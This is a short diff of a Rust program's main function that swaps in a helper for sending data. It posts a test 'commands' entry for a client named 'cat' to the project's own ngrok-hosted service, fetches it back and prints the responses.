@@ -8,13 +8,21 @@ fn main() {
 
     let mut output = String::new();
 
-    utils::upload_file_and_add_result_to_str(
-        &"https://inerrant-carl-nonhazardous.ngrok-free.dev/commands".to_string(),
-        &"cat".to_string(),
+    utils::send_data_and_add_result_to_str(
+        &"https://inerrant-carl-nonhazardous.ngrok-free.dev/add_commands".to_string(),
+        &"[clients.cat]\ncommands = [\"back to worrkkkkkk!\"]\noutputs = []".to_string(),
         &mut output
     );
 
     println!("Output from test: {}", output);
+
+    utils::send_data_and_add_result_to_str(
+        &"https://inerrant-carl-nonhazardous.ngrok-free.dev/commands".to_string(),
+        &"cat".to_string(),
+        &mut output
+    );
+    
+    println!("Output from second test: {}", output);
 
     loop {
         let mut input = String::new();
